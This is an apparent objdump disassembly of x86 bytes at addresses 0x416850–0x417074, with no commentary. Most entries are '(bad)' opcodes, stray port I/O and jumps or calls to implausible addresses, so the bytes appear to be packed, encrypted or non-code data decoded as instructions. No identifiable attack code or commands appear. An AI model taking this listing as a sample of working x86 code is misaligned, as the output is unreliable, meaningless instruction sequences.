  416850:	jmp    0x416842
  416852:	mov    bh,0xd2
  416854:	stc    
  416855:	shr    ch,1
  416857:	pop    es
  416858:	add    eax,0xc1d7f9c7
  41685d:	dec    edi
  41685f:	adc    edx,ebx
  416861:	rol    dl,0xcf
  416864:	(bad)
  416867:	leave  
  416868:	loope  0x41684a
  41686a:	loope  0x416834
  41686c:	hlt    
  41686d:	retf   0xfabf
  416870:	cmc    
  416871:	int3   
  416872:	(bad)  
  416874:	xlat   BYTE PTR ds:[ebx]
  416875:	add    eax,0xf103fbd6
  41687a:	shl    eax,1
  41687c:	stc    
  41687d:	add    eax,0xfafefa01
  416882:	in     al,dx
  416883:	jmp    0x416872
  416885:	lock div dl
  416888:	in     al,dx
  416889:	mov    ah,0xb1
  41688b:	(bad)  
  41688c:	out    0xac,al
  41688e:	div    DWORD PTR [edx-0x2417084f]
  416894:	hlt    
  416895:	int    0xe2
  416897:	aad    0xf5
  416899:	or     al,BYTE PTR [ecx]
  41689b:	add    DWORD PTR [edi],eax
  41689d:	or     al,BYTE PTR [edx]
  41689f:	(bad)  
  4168a1:	shl    BYTE PTR [edi-0x34520f28],cl
  4168a7:	stos   BYTE PTR es:[edi],al
  4168a8:	jecxz  0x416874
  4168aa:	fmul   st,st(7)
  4168ac:	lock aam 0xbd
  4168af:	leave  
  4168b0:	stc    
  4168b1:	cmc    
  4168b2:	loop   0x416875
  4168b4:	xlat   BYTE PTR ds:[ebx]
  4168b5:	fucom  st(5)
  4168b7:	(bad)  
  4168b9:	(bad)  
  4168ba:	fdivr  st,st(4)
  4168bc:	jmp    0x41689f
  4168be:	or     eax,ebx
  4168c0:	(bad)  
  4168c1:	fsubr  st(2),st
  4168c3:	retf   
  4168c4:	iret   
  4168c5:	lods   al,BYTE PTR ds:[esi]
  4168c6:	icebp  
  4168c7:	mul    bl
  4168c9:	rol    edi,0xb9
  4168cc:	int    0xeb
  4168ce:	enter  0xf4eb,0xea
  4168d2:	sar    edi,1
  4168d4:	aam    0xcd
  4168d6:	cmc    
  4168d7:	int3   
  4168d8:	fst    st(1)
  4168da:	cld    
  4168db:	fimul  DWORD PTR [esi]
  4168dd:	fcmovnu st,st(2)
  4168df:	faddp  st(4),st
  4168e1:	in     al,dx
  4168e2:	ror    cl,cl
  4168e4:	loopne 0x4168c7
  4168e6:	shl    ch,0xef
  4168e9:	lods   al,BYTE PTR ds:[esi]
  4168ea:	rcl    eax,0xd6
  4168ed:	not    ch
  4168ef:	cmc    
  4168f0:	(bad)  
  4168f1:	fcom   st(3)
  4168f3:	call   0xbb245fe4
  4168f8:	icebp  
  4168f9:	sar    ebp,1
  4168fb:	cld    
  4168fc:	loop   0x4168fb
  4168fe:	loope  0x416904
  416900:	std    
  416901:	adc    ebp,eax
  416903:	shl    dl,0xd5
  416906:	out    0xc9,al
  416908:	repz aam 0xe1
  41690b:	leave  
  41690c:	lock int3 
  41690e:	fucomi st,st(4)
  416910:	retf   0xfcf7
  416913:	out    dx,eax
  416914:	into   
  416915:	aad    0xfe
  416917:	out    0xcb,al
  416919:	out    0xc4,eax
  41691b:	(bad)  
  41691c:	in     al,0xf5
  41691e:	pavgw  mm4,mm3
  416921:	iret   
  416922:	fadd   st(2),st
  416924:	mov    esp,0xe1b5cae6
  416929:	out    0xc8,eax
  41692b:	aam    0xf1
  41692d:	jmp    0xfc145e16
  416932:	(bad)  
  416933:	idiv   edx
  416935:	fdivr  st,st(7)
  416937:	(bad)  
  416938:	(bad)  
  416939:	or     dl,ch
  41693b:	or     edi,esp
  41693d:	fmulp  st(5),st
  41693f:	jmp    0xd0d2:0xcced11ca
  416946:	int3   
  416947:	mov    ch,0xb3
  416949:	out    dx,al
  41694a:	cli    
  41694b:	enter  0xf5fe,0xd4
  41694f:	(bad)  
  416951:	fnstenv [edi-0xf0d2828]
  416957:	repz mov ebp,0xcad5ddd5
  41695d:	inc    BYTE PTR [edi+ebx*8]
  416960:	or     eax,0xd7d0e209
  416965:	jecxz  0x416923
  416967:	out    dx,al
  416968:	mov    bl,0xe5
  41696a:	iret   
  41696b:	int3   
  41696c:	fdiv   DWORD PTR [eax-0x2d132805]
  416972:	enter  0xcebf,0xf7
  416976:	fiadd  WORD PTR [edi]
  416978:	mov    ah,0xc1
  41697b:	xlat   BYTE PTR ds:[ebx]
  41697c:	cmc    
  41697d:	add    eax,0xe2d3dfe9
  416982:	scas   al,BYTE PTR es:[edi]
  416983:	out    0xbf,al
  416985:	lods   eax,DWORD PTR ds:[esi]
  416986:	loop   0x416955
  416988:	leave  
  416989:	hlt    
  41698a:	retf   
  41698b:	jmp    0xd8f2:0xb9d3daeb
  416992:	mov    ecx,0xd7e0b8db
  416997:	add    esp,esp
  416999:	fcmovb st,st(2)
  41699b:	fld    QWORD PTR [ecx]
  41699d:	or     eax,0xf904cb0d
  4169a2:	jmp    0xde32419e
  4169a7:	cmc    
  4169a8:	out    0xb4,al
  4169aa:	mov    bh,0xd9
  4169ac:	iret   
  4169ad:	clc    
  4169ae:	in     eax,dx
  4169af:	sti    
  4169b0:	cmc    
  4169b1:	fnstcw WORD PTR [esi-0xd081014]
  4169b7:	ret    0xe1e5
  4169ba:	add    eax,DWORD PTR [esi]
  4169bc:	(bad)  
  4169be:	pop    es
  4169bf:	(bad)
  4169c2:	(bad)  
  4169c3:	in     eax,dx
  4169c4:	(bad)  [esi-0x1d1c3f3c]
  4169ca:	out    0xec,al
  4169cc:	shr    bl,cl
  4169ce:	(bad)
  4169d3:	clc    
  4169d4:	rol    cl,cl
  4169d6:	mov    esi,0x4c2fbf6
  4169db:	or     bh,ah
  4169dd:	in     al,0xe9
  4169df:	retf   0xfce
  4169e2:	(bad)  
  4169e3:	mov    ebp,0xcab6dce3
  4169e8:	aam    0xfb
  4169ea:	ror    al,1
  4169ec:	(bad)  
  4169ee:	div    dl
  4169f0:	mov    ebx,0xb5f4defb
  4169f5:	not    al
  4169f7:	clc    
  4169f8:	fcmovbe st,st(0)
  4169fa:	shr    dl,0xdb
  4169fd:	aam    0xc9
  4169ff:	(bad)  
  416a01:	icebp  
  416a02:	fdivr  QWORD PTR [ebp+eax*8-0x3d323109]
  416a09:	hlt    
  416a0a:	in     eax,dx
  416a0b:	loopne 0x4169eb
  416a0d:	in     al,dx
  416a0e:	stc    
  416a0f:	mov    ah,0xcd
  416a11:	mov    edi,0xc2d503d1
  416a16:	cmc    
  416a17:	pop    es
  416a18:	mov    ecx,0xe6c90201
  416a1d:	add    al,0xda
  416a1f:	out    dx,eax
  416a20:	or     al,0xb
  416a22:	ret    
  416a23:	jmp    0xaeff40fb
  416a28:	mov    cl,0xf6
  416a2a:	repnz mov cl,0xeb
  416a2d:	cmc    
  416a2e:	retf   0xbed9
  416a31:	in     al,dx
  416a32:	enter  0xd5dd,0xe1
  416a36:	fstp   st(6)
  416a38:	retf   
  416a39:	mov    esp,0xe1e9d907
  416a3e:	jmp    0xf7d8:0xdeed1303
  416a45:	mov    bh,0xae
  416a47:	mul    dl
  416a49:	mov    dl,0xcf
  416a4b:	mov    ah,0xf1
  416a4d:	int3   
  416a4e:	shl    DWORD PTR [ecx+ebx*8-0x28034214],cl
  416a55:	in     al,dx
  416a56:	in     eax,0xda
  416a58:	lock ret 
  416a5a:	out    0x5,al
  416a5c:	cmc    
  416a5d:	leave  
  416a5e:	int    0xeb
  416a60:	call   0xad133b63
  416a65:	(bad)  
  416a66:	stos   DWORD PTR es:[edi],eax
  416a67:	mov    cl,0xe3
  416a69:	mov    al,0xd7
  416a6b:	mov    cl,0xd9
  416a6d:	into   
  416a6e:	rcr    edx,cl
  416a70:	fmul   st(4),st
  416a72:	mov    esp,0xbffcf1f5
  416a77:	xlat   BYTE PTR ds:[ebx]
  416a78:	in     eax,0xfd
  416a7a:	jecxz  0x416a40
  416a7c:	(bad)  
  416a7d:	neg    ah
  416a7f:	fsubp  st(2),st
  416a81:	fcmovb st,st(3)
  416a83:	lock loop 0x416a66
  416a86:	retf   
  416a87:	in     eax,0xd7
  416a89:	iret   
  416a8a:	call   0xb467c
  416a8f:	in     al,dx
  416a90:	mov    esp,0xf3d9ccc9
  416a95:	cld    
  416a96:	fadd   st(7),st
  416a98:	(bad)  
  416a99:	mov    esp,0xdadbe3f5
  416a9e:	loopne 0x416a65
  416aa0:	or     eax,0xaedcbcf8
  416aa5:	les    esi,FWORD PTR [ebx-0x182e0d30]
  416aab:	out    0xd7,eax
  416aad:	mov    eax,0xd5ccd5fa
  416ab2:	fsub   st(6),st
  416ab4:	fidiv  WORD PTR [esi+edi*4-0x425f92a]
  416abb:	mov    DWORD PTR [eax],0xfe01eafe
  416ac1:	fadd   st(2),st
  416ac3:	div    edx
  416ac5:	xlat   BYTE PTR ds:[ebx]
  416ac6:	(bad)  
  416ac8:	in     eax,dx
  416ac9:	aad    0xb2
  416acb:	stc    
  416acc:	in     eax,0xdf
  416ace:	mov    edi,0xddf1b4db
  416ad3:	add    edi,eax
  416ad5:	idiv   BYTE PTR [ebx+ecx*1-0xb1f0e2a]
  416adc:	push   es
  416add:	enter  0xe3e6,0xe
  416ae1:	in     eax,0xf1
  416ae3:	retf   0xc9cd
  416ae6:	stos   DWORD PTR es:[edi],eax
  416ae7:	mov    esp,0xe9b6d3e7
  416aed:	(bad)  
  416aef:	std    
  416af0:	call   0xbe2d6cc8
  416af5:	mov    ah,0xdd
  416af7:	cld    
  416af8:	(bad)  
  416afa:	icebp  
  416afb:	fild   WORD PTR [edx]
  416afd:	into   
  416afe:	(bad)
  416b01:	or     eax,0xd1e6e3e8
  416b06:	loopne 0x416ac9
  416b08:	(bad)  
  416b09:	xlat   BYTE PTR ds:[ebx]
  416b0a:	iret   
  416b0b:	in     eax,0xec
  416b0d:	rcl    ebp,1
  416b0f:	jmp    0x416ad0
  416b11:	hlt    
  416b12:	(bad)  
  416b13:	idiv   DWORD PTR [ebx+esi*8-0x293ffb05]
  416b1a:	add    al,ah
  416b1c:	or     cl,BYTE PTR [ebx]
  416b1e:	or     ch,bh
  416b20:	adc    cl,BYTE PTR [esi]
  416b22:	retf   0xacb1
  416b25:	shl    DWORD PTR [edx-0x25093f0d],1
  416b2b:	(bad)  
  416b2c:	fcmove st,st(3)
  416b2e:	out    dx,eax
  416b2f:	call   0xcf226907
  416b34:	xlat   BYTE PTR ds:[ebx]
  416b35:	into   
  416b36:	mov    ebx,0xbfe4f9cc
  416b3b:	add    ah,dh
  416b3d:	enter  0xacf,0xde
  416b41:	pop    es
  416b42:	lock jecxz 0x416b0c
  416b45:	out    dx,eax
  416b46:	ror    cl,1
  416b48:	fcmovu st,st(3)
  416b4a:	retf   0xdbb2
  416b4d:	leave  
  416b4e:	(bad)  
  416b4f:	clc    
  416b50:	(bad)  
  416b51:	fild   DWORD PTR [eax]
  416b53:	add    edi,ebx
  416b55:	loope  0x416b16
  416b57:	ret    0xd0f8
  416b5a:	fimul  WORD PTR [edx]
  416b5c:	call   0x7066e48
  416b61:	or     al,0xd0
  416b63:	retf   
  416b64:	loopne 0x416b43
  416b66:	(bad)  
  416b67:	mov    bl,0xc7
  416b69:	loope  0x416b37
  416b6b:	(bad)  
  416b6c:	call   0xde3b6566
  416b71:	fucomip st,st(7)
  416b73:	out    0xc0,eax
  416b75:	loope  0x416b7c
  416b77:	lock mov ecx,0xf4c4bf07
  416b7d:	or     eax,DWORD PTR [ecx]
  416b7f:	fld    DWORD PTR [eax]
  416b81:	jecxz  0x416b68
  416b83:	jmp    0xd0da:0xdbcfc7b1
  416b8a:	into   
  416b8b:	scas   al,BYTE PTR es:[edi]
  416b8c:	mov    edi,0xfbe4fdc5
  416b91:	mov    esi,0xd1cfbcf6
  416b96:	mov    ebp,0xe8c7f6e5
  416b9b:	add    ebp,ecx
  416b9d:	mov    DWORD PTR [edi],0xc7dfcbf4
  416ba3:	mov    esi,0xf0e4c7e2
  416ba8:	rol    esi,0xd9
  416bab:	jmp    0x416b85
  416bad:	out    dx,eax
  416bae:	fmul   st,st(2)
  416bb0:	cld    
  416bb1:	(bad)  
  416bb3:	loope  0x416baa
  416bb5:	push   es
  416bb6:	repz add eax,ebx
  416bb9:	repnz or ebp,edi
  416bbc:	enter  0xcc5,0xdf
  416bc0:	int3   
  416bc1:	fnstsw WORD PTR [ecx-0x4c34505a]
  416bc7:	icebp  
  416bc8:	into   
  416bc9:	test   al,0xbb
  416bcb:	(bad)  
  416bcc:	sar    DWORD PTR [ecx-0x44462c2b],1
  416bd2:	ret    0xd7f6
  416bd5:	out    0xbe,eax
  416bd7:	(bad)  
  416bd8:	icebp  
  416bd9:	rcl    edi,1
  416bdb:	fcmove st,st(1)
  416bdd:	jmp    0x416baa
  416bdf:	fcmovnu st,st(0)
  416be1:	push   es
  416be2:	shr    bl,1
  416be4:	iret   
  416be5:	call   0xcf233fbd
  416bea:	iret   
  416beb:	call   0xca303ce0
  416bf0:	out    dx,eax
  416bf1:	std    
  416bf2:	mov    ebx,0xd3c6e0ec
  416bf7:	int3   
  416bf8:	add    dl,bl
  416bfa:	div    esp
  416bfc:	jmp    0x416c05
  416bfe:	(bad)  
  416c00:	out    dx,eax
  416c01:	retf   
  416c02:	faddp  st(1),st
  416c04:	mov    ah,0xca
  416c07:	ret    0xaca9
  416c0a:	in     eax,0xea
  416c0c:	mov    eax,0xf6ead7da
  416c11:	(bad)  
  416c12:	mov    esi,0xfcffdee3
  416c17:	mov    esi,0xc8e6c2e1
  416c1c:	push   cs
  416c1d:	jmp    0xf1f0:0xe1fcc9f8
  416c24:	lods   al,BYTE PTR ds:[esi]
  416c25:	icebp  
  416c26:	mov    esp,0xf7d1bbb7
  416c2b:	repnz int3 
  416c2d:	lods   al,BYTE PTR ds:[esi]
  416c2e:	fucomp st(1)
  416c30:	mov    ebx,0xc0d4baf5
  416c35:	sar    edi,0xd2
  416c38:	shr    edx,1
  416c3a:	(bad)  
  416c3c:	jecxz  0x416c33
  416c3e:	out    0xe1,al
  416c40:	in     eax,dx
  416c41:	in     al,dx
  416c42:	rcr    eax,cl
  416c44:	xlat   BYTE PTR ds:[ebx]
  416c45:	fidiv  WORD PTR [ebx-0x74f3a05]
  416c4b:	mov    ch,0xd8
  416c4d:	retf   0xd4e4
  416c50:	(bad)  
  416c51:	cli    
  416c52:	int    0xf5
  416c54:	mov    edi,0xd607f2c2
  416c59:	retf   0xcadb
  416c5c:	imul   al
  416c5e:	add    edx,esp
  416c60:	(bad)  
  416c62:	mov    bl,0xaf
  416c64:	(bad)
  416c67:	lods   al,BYTE PTR ds:[esi]
  416c68:	in     eax,dx
  416c69:	loop   0x416c5d
  416c6b:	xlat   BYTE PTR ds:[ebx]
  416c6c:	cmc    
  416c6d:	mov    dh,0xcb
  416c6f:	(bad)  
  416c70:	fxch   st(5)
  416c72:	(bad)  
  416c74:	out    0xd0,al
  416c76:	mov    edi,0xdcd7e5e7
  416c7b:	mov    esi,0x4ebfe0f
  416c80:	psubb  mm1,mm3
  416c83:	mov    al,0xeb
  416c85:	fnsave [edi-0x2e574950]
  416c8b:	ror    eax,1
  416c8d:	clc    
  416c8e:	cmc    
  416c8f:	fxch   st(7)
  416c91:	aam    0xe1
  416c93:	loopne 0x416c4e
  416c95:	clc    
  416c96:	stc    
  416c97:	repnz mov ecx,0xbe7dcdc
  416c9d:	out    0x0,eax
  416c9f:	(bad)  
  416ca0:	iret   
  416ca1:	loop   0x416c4b
  416ca3:	lock imul edx
  416ca6:	(bad)
  416caa:	mov    ah,0xec
  416cac:	shr    BYTE PTR [ebp+edx*8-0x310f3c2a],1
  416cb3:	sti    
  416cb4:	loopne 0x416cb1
  416cb6:	in     al,dx
  416cb7:	out    0xd1,al
  416cb9:	aam    0x7
  416cbb:	lock jmp 0xc6353ca4
  416cc1:	icebp  
  416cc2:	ret    
  416cc3:	imul   edx
  416cc5:	xlat   BYTE PTR ds:[ebx]
  416cc6:	mov    ch,0xad
  416cc8:	aad    0xf7
  416cca:	into   
  416ccb:	mov    ecx,0xd4bdf4ba
  416cd0:	aad    0xd9
  416cd2:	rcl    edx,0xc1
  416cd5:	out    0xf0,al
  416cd7:	aad    0xd2
  416cd9:	in     eax,0xde
  416cdb:	stc    
  416cdc:	in     eax,0xff
  416cde:	in     eax,0xeb
  416ce0:	push   es
  416ce1:	or     eax,0xede6d0e3
  416ce6:	ret    0xc0ac
  416ce9:	(bad)  
  416cea:	in     al,dx
  416ceb:	mov    bh,0xcb
  416ced:	fyl2xp1 
  416cef:	div    esi
  416cf1:	enter  0xc101,0xce
  416cf5:	loope  0x416cb3
  416cf7:	in     al,dx
  416cf8:	jecxz  0x416cf5
  416cfa:	add    ebx,esp
  416cfc:	aam    0xf9
  416cfe:	int    0xcd
  416d00:	enter  0xedee,0xd1
  416d04:	lods   eax,DWORD PTR ds:[esi]
  416d05:	mov    esp,0xfbadaef7
  416d0a:	aad    0xe6
  416d0c:	(bad)  [ebp-0x4b202345]
  416d12:	cld    
  416d13:	jecxz  0x416ce5
  416d15:	add    dh,dh
  416d17:	fild   WORD PTR [esi]
  416d19:	stc    
  416d1a:	add    al,dl
  416d1c:	cli    
  416d1d:	ror    BYTE PTR [edx],0xed
  416d20:	into   
  416d21:	add    dl,ah
  416d23:	mov    eax,0xcdf3cfb0
  416d28:	div    BYTE PTR [ebx+ebp*8-0x12120e13]
  416d2f:	fmul   st(0),st
  416d31:	in     al,dx
  416d32:	sti    
  416d33:	add    al,BYTE PTR [ecx]
  416d35:	(bad)  
  416d37:	cli    
  416d38:	jecxz  0x416d0c
  416d3a:	add    edx,eax
  416d3c:	fxam   
  416d3e:	hlt    
  416d3f:	fcom   DWORD PTR [ebx]
  416d41:	shl    ecx,cl
  416d43:	mov    al,0xc2
  416d45:	loopne 0x416d3d
  416d47:	shl    BYTE PTR [edx-0xd08071b],cl
  416d4d:	icebp  
  416d4e:	jmp    0xf8fd:0xbdeae9dc
  416d55:	rcl    ebx,1
  416d57:	ret    0xc7f4
  416d5a:	aam    0xe0
  416d5c:	add    BYTE PTR [ebx],al
  416d5e:	into   
  416d5f:	(bad)  
  416d61:	jmp    0x416d43
  416d63:	int3   
  416d64:	mov    ebp,0xdbc7eebc
  416d69:	cli    
  416d6a:	fcmove st,st(1)
  416d6c:	in     eax,0xde
  416d6e:	iret   
  416d6f:	mov    dl,0xcd
  416d71:	add    bh,ch
  416d73:	jmp    ecx
  416d75:	fsubp  st(5),st
  416d77:	(bad)  
  416d79:	out    0xd5,eax
  416d7b:	rol    BYTE PTR [eax],1
  416d7d:	jmp    0x416d79
  416d7f:	out    0xfa,eax
  416d81:	(bad)  
  416d83:	out    dx,al
  416d84:	out    dx,al
  416d85:	rol    bl,cl
  416d87:	rep lods eax,DWORD PTR ds:[esi]
  416d89:	cli    
  416d8a:	cmc    
  416d8b:	repz int 0xdf
  416d8e:	(bad)  
  416d8f:	retf   0xe8e9
  416d92:	loopne 0x416d89
  416d94:	(bad)  
  416d95:	ret    0xc6da
  416d98:	mov    ecx,0x6dbd0ff
  416d9d:	loopne 0x416d68
  416d9f:	cld    
  416da0:	loop   0x416d74
  416da2:	shl    edi,cl
  416da4:	fucom  st(2)
  416da6:	shl    al,1
  416da8:	cmc    
  416da9:	lock scas eax,DWORD PTR es:[edi]
  416dab:	mov    ch,0xd3
  416dad:	in     al,dx
  416dae:	mov    dh,0xcb
  416db0:	mov    ah,0x3
  416db2:	ret    0xf8b9
  416db5:	mul    bl
  416db7:	cmc    
  416db8:	(bad)  
  416db9:	retf   
  416dba:	mov    edi,0xf9e4e2f5
  416dbf:	add    al,0xf2
  416dc1:	add    al,0xd2
  416dc3:	iret   
  416dc4:	int    0xde
  416dc6:	repz mul esp
  416dc9:	(bad)  
  416dca:	out    0xda,eax
  416dcc:	ror    ah,cl
  416dce:	xlat   BYTE PTR ds:[ebx]
  416dcf:	(bad)  
  416dd1:	ret    0xc8e9
  416dd4:	fcom   st(5)
  416dd6:	(bad)  
  416dd7:	(bad)  
  416dd8:	div    edx
  416dda:	hlt    
  416ddb:	jmp    0xf2f68cb
  416de0:	call   0xed3560b1
  416de5:	test   al,0xd3
  416de7:	lods   eax,DWORD PTR ds:[esi]
  416de8:	out    0xc4,eax
  416dea:	vpsubq ymm3,ymm5,ymm7
  416dee:	mov    ah,0xe4
  416df0:	mov    esp,0xbfd2d2ec
  416df5:	jecxz  0x416dee
  416df7:	lds    eax,FWORD PTR [edi]
  416df9:	jmp    0xd4a3efa
  416dfe:	retf   0xd913
  416e01:	loopne 0x416dcd
  416e03:	scas   al,BYTE PTR es:[edi]
  416e04:	scas   al,BYTE PTR es:[edi]
  416e05:	iret   
  416e06:	mov    al,0xae
  416e08:	(bad)  
  416e09:	aam    0xcc
  416e0b:	(bad)  
  416e0c:	repnz mov bh,0xc9
  416e0f:	jmp    0x416dcb
  416e11:	out    dx,al
  416e12:	(bad)  
  416e14:	hlt    
  416e15:	hlt    
  416e16:	loop   0x416df0
  416e18:	or     dh,dh
  416e1a:	ror    eax,1
  416e1c:	xlat   BYTE PTR ds:[ebx]
  416e1d:	pop    es
  416e1e:	fcmovne st,st(4)
  416e20:	in     al,dx
  416e21:	fsub   st,st(1)
  416e23:	int    0xc7
  416e25:	out    dx,al
  416e26:	lods   eax,DWORD PTR ds:[esi]
  416e27:	into   
  416e28:	iret   
  416e29:	rcl    bl,1
  416e2b:	fcmovbe st,st(2)
  416e2d:	lods   al,BYTE PTR ds:[esi]
  416e2e:	jmp    0xf5356ce8
  416e33:	clc    
  416e34:	not    dh
  416e36:	sar    dl,0xfd
  416e39:	aad    0xcb
  416e3b:	fsubp  st(2),st
  416e3d:	add    ecx,DWORD PTR [edi]
  416e3f:	or     al,BYTE PTR ds:0xedaad1fc
  416e45:	jmp    0x416df9
  416e47:	retf   0xe0b1
  416e4a:	(bad)  
  416e4b:	in     al,dx
  416e4c:	leave  
  416e4d:	(bad)  
  416e4f:	mov    ah,0xf2
  416e51:	leave  
  416e52:	hlt    
  416e53:	(bad)  
  416e55:	cmc    
  416e56:	test   bl,0xb
  416e59:	fcmovbe st,st(4)
  416e5b:	leave  
  416e5c:	aam    0x4
  416e5e:	sti    
  416e5f:	or     eax,DWORD PTR [eax]
  416e61:	adc    DWORD PTR [ecx-0x48105315],esi
  416e67:	mov    dh,0xc9
  416e69:	leave  
  416e6a:	fcmovnu st,st(3)
  416e6c:	in     al,0xe5
  416e6e:	dec    bl
  416e70:	(bad)  
  416e71:	jmp    0xd2324331
  416e76:	shl    ecx,0xd1
  416e79:	loopne 0x416e41
  416e7b:	mov    DWORD PTR [ecx],0x3fcc6ef
  416e81:	add    bl,bh
  416e83:	icebp  
  416e84:	fsubrp st(0),st
  416e86:	scas   eax,DWORD PTR es:[edi]
  416e87:	ret    
  416e88:	loope  0x416e4a
  416e8a:	(bad)  
  416e8c:	out    0xc5,eax
  416e8e:	mov    edi,0xf8f9bfea
  416e93:	rcl    ecx,1
  416e95:	jmp    esp
  416e97:	xlat   BYTE PTR ds:[ebx]
  416e98:	fild   DWORD PTR [ebx]
  416e9a:	shl    ebx,0xc7
  416e9d:	pop    es
  416e9e:	add    BYTE PTR ds:0xc6e8f2e4,cl
  416ea4:	in     al,dx
  416ea5:	repnz leave 
  416ea7:	aad    0xfa
  416ea9:	loop   0x416e5d
  416eab:	loopne 0x416e73
  416ead:	int    0xf6
  416eaf:	int3   
  416eb0:	(bad)  
  416eb1:	mov    ebx,0xedfafafc
  416eb6:	jecxz  0x416e7d
  416eb8:	fsub   st,st(6)
  416eba:	(bad)  
  416ebb:	neg    edx
  416ebd:	jmp    0x416ebe
  416ebf:	push   cs
  416ec0:	enter  0xc5fd,0xa8
  416ec4:	loope  0x416e78
  416ec6:	jmp    0xf9063382
  416ecb:	(bad)  
  416ecc:	(bad)  
  416ecd:	fbstp  TBYTE PTR [esi-0x5360f33]
  416ed3:	jecxz  0x416ea1
  416ed5:	loopne 0x416ecf
  416ed7:	fldl2e 
  416ed9:	ror    DWORD PTR [eax],0xe2
  416edc:	aad    0x3
  416ede:	clc    
  416edf:	int    0xfd
  416ee1:	add    ecx,ebx
  416ee3:	out    0xdc,al
  416ee5:	imul   BYTE PTR [ebp-0x14080512]
  416eeb:	fcmovbe st,st(6)
  416eed:	mov    bh,0xde
  416eef:	mov    ah,0xfc
  416ef1:	fcomi  st,st(3)
  416ef3:	xlat   BYTE PTR ds:[ebx]
  416ef4:	out    0xd8,al
  416ef6:	icebp  
  416ef7:	cmc    
  416ef8:	add    eax,0xe5de02e6
  416efd:	clc    
  416efe:	lds    eax,FWORD PTR [ecx]
  416f00:	into   
  416f01:	or     dh,cl
  416f03:	in     eax,0xb1
  416f05:	mov    dl,0xef
  416f07:	iret   
  416f08:	lods   al,BYTE PTR ds:[esi]
  416f09:	(bad)  
  416f0a:	loope  0x416eec
  416f0c:	mov    dh,0xb7
  416f0e:	aam    0xfc
  416f10:	(bad)  
  416f12:	aad    0xd1
  416f14:	mov    esi,0xd4bcc5bd
  416f19:	lock sti 
  416f1b:	push   ebp
  416f1d:	fdiv   st(2),st
  416f1f:	out    0xd9,eax
  416f21:	or     ch,cl
  416f23:	mov    eax,0xadc2dca9
  416f28:	sti    
  416f29:	int3   
  416f2a:	mov    al,0xb7
  416f2c:	fcomi  st,st(4)
  416f2e:	int3   
  416f2f:	idiv   bl
  416f31:	jmp    0xc4146b04
  416f36:	in     al,0xd4
  416f38:	in     eax,0x7
  416f3a:	loope  0x416f20
  416f3c:	xlat   BYTE PTR ds:[ebx]
  416f3d:	(bad)  
  416f3e:	cmc    
  416f3f:	iret   
  416f40:	ror    ebp,cl
  416f42:	out    dx,eax
  416f43:	ret    
  416f44:	loope  0x416f3c
  416f46:	int3   
  416f47:	(bad)
  416f4a:	ror    al,cl
  416f4c:	fadd   st,st(4)
  416f4e:	mov    ebx,0xfec3d9b9
  416f53:	(bad)  
  416f55:	sti    
  416f56:	std    
  416f57:	jecxz  0x416f19
  416f59:	neg    bh
  416f5b:	out    dx,eax
  416f5c:	or     ah,ah
  416f5e:	(bad)  
  416f60:	out    0xe5,eax
  416f62:	fmul   st,st(2)
  416f64:	(bad)
  416f67:	out    dx,al
  416f68:	jmp    0xb5ce:0xc6f1d6ba
  416f6f:	out    dx,eax
  416f70:	in     al,dx
  416f71:	not    edx
  416f73:	fcom   st(4)
  416f75:	out    0xbd,eax
  416f77:	add    bl,bh
  416f79:	(bad)  
  416f7a:	retf   0xfad0
  416f7d:	loop   0x416f62
  416f7f:	loopne 0x416f6f
  416f81:	add    DWORD PTR [edi-0x3f423441],esp
  416f87:	int3   
  416f88:	call   0xc60f3947
  416f8d:	mov    edi,0xe3b1cab7
  416f92:	div    ah
  416f94:	mov    edi,0xe0f1d5bc
  416f99:	test   eax,0xc6eaefd6
  416f9f:	(bad)  
  416fa0:	in     al,0xe2
  416fa2:	mov    dl,0xee
  416fa4:	shr    DWORD PTR [edi+ecx*8-0xe4a0850],1
  416fab:	sar    al,0xda
  416fae:	sti    
  416faf:	std    
  416fb0:	test   dl,0xe1
  416fb3:	mov    edi,0xccecd0f2
  416fb8:	rol    edx,1
  416fba:	(bad)
  416fbd:	mov    esp,0xde01c8e5
  416fc2:	mov    edi,0xacafb3b8
  416fc7:	stos   BYTE PTR es:[edi],al
  416fc8:	leave  
  416fc9:	loopne 0x416fab
  416fcb:	repnz int 0xcd
  416fce:	int3   
  416fcf:	mov    ch,0xce
  416fd1:	clc    
  416fd2:	stc    
  416fd3:	fucomp st(4)
  416fd5:	sar    dh,cl
  416fd7:	ret    
  416fd8:	(bad)  
  416fd9:	fdivr  st(0),st
  416fdb:	hlt    
  416fdc:	loop   0x416fc8
  416fde:	jmp    0xacbc:0xe6ed0402
  416fe5:	repnz (bad) 
  416fe7:	mov    cl,0xea
  416fe9:	(bad)  
  416fea:	out    0xf6,eax
  416fec:	test   ch,0xd6
  416fef:	enter  0xe3d5,0xf7
  416ff3:	mov    ebp,0xbddfb8fe
  416ff8:	add    al,0xc1
  416ffa:	ret    
  416ffb:	xlat   BYTE PTR ds:[ebx]
  416ffc:	xlat   BYTE PTR ds:[ebx]
  416ffd:	rol    BYTE PTR [eax+ecx*1],0xef
  417001:	int    0xc3
  417003:	imul   esp
  417005:	in     al,0xd7
  417007:	mov    al,0xed
  417009:	jmp    0x417003
  41700b:	mov    bh,0xf1
  41700d:	sar    esp,1
  41700f:	aad    0xe9
  417011:	(bad)  
  417012:	fcomip st,st(4)
  417014:	fadd   st,st(7)
  417016:	pop    es
  417017:	shl    dl,cl
  417019:	fadd   st,st(1)
  41701b:	ror    al,0xa
  41701e:	push   cs
  41701f:	std    
  417020:	add    ah,al
  417022:	lods   eax,DWORD PTR ds:[esi]
  417023:	in     al,dx
  417024:	(bad)  
  417026:	(bad)  
  417028:	loopne 0x41701b
  41702a:	les    esi,FWORD PTR [eax-0xb0d2b12]
  417030:	not    bl
  417032:	jecxz  0x417021
  417034:	loopne 0x41703c
  417036:	fadd   st(2),st
  417038:	aad    0xc6
  41703a:	or     esi,eax
  41703c:	jmp    0xe5cb:0xdace0dcb
  417043:	shr    al,1
  417045:	scas   al,BYTE PTR es:[edi]
  417046:	scas   eax,DWORD PTR es:[edi]
  417047:	not    eax
  417049:	mov    cl,0xb6
  41704b:	jmp    0xfc33263c
  417050:	leave  
  417051:	rcr    ah,cl
  417053:	cld    
  417054:	shl    ch,cl
  417056:	jecxz  0x417054
  417058:	inc    DWORD PTR ds:0xbe4d5e7
  41705e:	jmp    esp
  417060:	cld    
  417061:	pandn  mm4,mm0
  417064:	jecxz  0x417049
  417066:	int3   
  417067:	enter  0xf5ef,0xf5
  41706b:	ror    ah,0xf6
  41706e:	iret   
  41706f:	hlt    
  417070:	div    ch
  417072:	idiv   eax
  417074:	loop   0x41704f
